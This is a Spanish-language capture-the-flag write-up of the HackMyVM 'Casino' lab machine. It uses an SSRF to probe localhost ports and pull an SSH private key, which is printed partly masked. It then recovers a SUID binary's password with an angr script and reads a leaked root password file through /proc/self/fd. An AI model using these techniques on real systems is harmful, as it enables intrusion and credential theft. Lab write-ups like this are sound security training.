---
layout: post
title: Casino - Hackmyvm
tags: [ctf, hackmyvm, by-me]
---

**Autor**: 0xH3rshel \\
**Dificultad**: Medio

![img](/imgs/write-ups/by-me/casino/casino.png#center)

## Reconocimiento

Lo primero como siempre es escanear los puertos disponibles. En esta máquina solo vemos abiertos el 22 (ssh) y el 80 (apache http).
```
$ sudo nmap -p- 192.168.1.104       
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-05 06:16 EDT
Nmap scan report for 192.168.1.104
Host is up (0.00010s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:B5:2A:E3 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.47 seconds
```

### Games

Tras crear una cuenta e iniciar sesión en el casino, me encuentro con una serie de juegos de apuestas y 1000$ iniciales.

![img](/imgs/write-ups/by-me/casino/casino_1.png#center)

Si en algún juego me quedo sin dinero, soy redirigido a una página llamada "explainmepls.php" en la cual se carga la wikipedia de alguno de los juegos. Tal como se puede ver en la url.

![img](/imgs/write-ups/by-me/casino/casino_2.png#center)

Apuesto y pierdo todo.

![img](/imgs/write-ups/by-me/casino/casino_3.png#center)

## Explotación

Como se demuestra en la siguiente imágen, existe una vulnerabilidad de tipo **ssrf** con la cual podemos hacer peticiones a otras páginas desde la máquina Casino.

![img](/imgs/write-ups/by-me/casino/casino_4.png#center)

### SSRF

Voy a buscar puertos en la máquina casino solo accesibles desde localhost.

```
$ for i in {1..65535};do echo $i >> nums; done
$ ffuf -w nums -u "http://192.168.1.104/casino/explainmepls.php?learnabout=localhost:FUZZ" -b "PHPSESSID=lsfftgbqs7kkudnn11auta1kus" -fw 284
[...]

[Status: 200, Size: 2267, Words: 576, Lines: 98, Duration: 2644ms]
    * FUZZ: 80
[Status: 200, Size: 1968, Words: 499, Lines: 81, Duration: 39ms]
    * FUZZ: 6969
```

El puerto 6969 está abierto. Además de esto, busco también subdirectorios.

```
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u "http://192.168.1.104/casino/explainmepls.php?learnabout=localhost:6969/FUZZ" -b "PHPSESSID=lsfftgbqs7kkudnn11auta1kus" -fw 284
[...]
[Status: 200, Size: 1406, Words: 317, Lines: 65, Duration: 43ms]
    * FUZZ: codebreakers
```

Si realizo un **curl** en este subdirectorio, puedo ver que se hace referencia a un archivo de clave privada con el nombre del usuario **Shimmer**.

```
$ curl "http://192.168.1.104/casino/explainmepls.php?learnabout=localhost:6969/codebreakers" -H "Cookie: PHPSESSID=lsfftgbqs7kkudnn11auta1kus"
[...]
<body>
    Pls Shimmer, dont f*ck this up again...
    <a href="./shimmer_rsa"></a>
</body>
[...]
```

Puedo obtener este archivo también usando **curl**.

```
$ curl "http://192.168.1.104/casino/explainmepls.php?learnabout=localhost:6969/codebreakers/shimmer_rsa" -H "Cookie: PHPSESSID=lsfftgbqs7kkudnn11auta1kus"
<h1>LEARN HOW TO PLAY FIRST ;)</h1>

        <div id="games">
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
</div>
[...]
```

## Esladado de privilegios

Tras iniciar sesión con la clave privada, encuentro un binario con permiso **SUID** llamado "pass".

```
$ ssh shimmer@192.168.1.104 -i shimmer  
Debian GNU/Linux 12
Welcome to Binary Bet Casino
--------------------------------

Linux casino 6.1.0-9-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64
shimmer@casino:~$ :)
shimmer@casino:~$ ls -la
[...]
-rwsr-xr-x 1 root    root    16432 jun 14 16:48 pass
[...]
```

### Pass

Lo primero que hago es copiar el binario a mi máquina kali para analizarlo. En esta ocasión lo hago con **Cutter**.

![img](/imgs/write-ups/by-me/casino/casino_5.png#center)

Partes a tener en cuenta.

1. Llama a una función en la que comprueba una contraseña.
2. Abre el archivo "/opt/root.pass" pero no lo cierra. (Esto será importante).
3. Se puede leer otra comprobación de contraseña.
4. Si ambas contraseñas son correctas, se nos abre una shell (como usuario normal, no root).

### CheckPasswd

Como se puede ver, realiza un montón de comprobaciones y si la contraseña es correcta, imprime "Correct pass".

![img](/imgs/write-ups/by-me/casino/casino_6.png#center)

### Angr

La primera contraseña la obtenemos realizando un análisis simbólico del binario. En el siguiente enlace se puede ver un [EJEMPLO](https://trevorsaudi.com/posts/symbolic_execution_angr_part1/).

```py
import angr
import sys 

def main():
    path_to_binary =  './pass'
    project = angr.Project(path_to_binary)
    initial_state = project.factory.entry_state() 
    simulation = project.factory.simgr(initial_state) 
    simulation.explore(find=lambda s: b"Correct pass" in s.posix.dumps(1))

    if simulation.found:
        solution_state = simulation.found[0]
        solution = solution_state.posix.dumps(sys.stdin.fileno())
        print("[+] Success! Solution is: {}".format(solution.decode('utf-8')))

    else:
        raise Exception("Could not find the solution")


if __name__ == "__main__":
    main()
```

Tras ejecutarlo, obtengo la contraseña.

```
$ python3 symbolic.py 
WARNING  | 2023-07-05 12:41:43,469 | angr.storage.memory_mixins.default_filler_mixin | The program is accessing memory with an unspecified value. This could indicate unwanted behavior.
WARNING  | 2023-07-05 12:41:43,469 | angr.storage.memory_mixins.default_filler_mixin | angr will cope with this by generating an unconstrained symbolic variable and continuing. You can resolve this by:
WARNING  | 2023-07-05 12:41:43,469 | angr.storage.memory_mixins.default_filler_mixin | 1) setting a value to the initial state
WARNING  | 2023-07-05 12:41:43,469 | angr.storage.memory_mixins.default_filler_mixin | 2) adding the state option ZERO_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to make unknown regions hold null
WARNING  | 2023-07-05 12:41:43,469 | angr.storage.memory_mixins.default_filler_mixin | 3) adding the state option SYMBOL_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to suppress these messages.
WARNING  | 2023-07-05 12:41:43,470 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff80 with 1 unconstrained bytes referenced from 0x589e40 (strlen+0x0 in libc.so.6 (0x89e40))
WARNING  | 2023-07-05 12:41:45,686 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffefeff with 1 unconstrained bytes referenced from 0x4016d7 (main+0x51 in pass (0x16d7))
[+] Success! Solution is: ihope*********************
```

De vuelta en la máquina casino, introducimos las dos contraseñas y se nos abre una shell.

```
shimmer@casino:~$ ./pass 
Passwd: ihope*********************
Correct pass
Second Passwd: ultra**************
$
```

Anteriormente he visto que el archivo "/opt/root.pass" se había abierto dentro del binario y no se había cerrado, por lo que todavía es accesible desde la shell que acabamos de obtener. Lo podemos encontrar en "/proc/self/fd" y leerlo de la siguiente manera.

```
$ cd /proc/self/fd
$ ls -l
total 0
0 lrwx------ 1 shimmer shimmer 64 jul  5 12:56 0 -> /dev/pts/0
0 lrwx------ 1 shimmer shimmer 64 jul  5 12:56 1 -> /dev/pts/0
0 lrwx------ 1 shimmer shimmer 64 jul  5 12:56 10 -> /dev/tty
0 lrwx------ 1 shimmer shimmer 64 jul  5 12:56 2 -> /dev/pts/0
0 lr-x------ 1 shimmer shimmer 64 jul  5 12:56 3 -> /opt/root.pass
$ cat <&3
m**********
[...]
shimmer@casino:~$ su root
Contraseña: 
root@casino:/home/shimmer# :)
```

## Fin

Espero que os haya gustado. :)
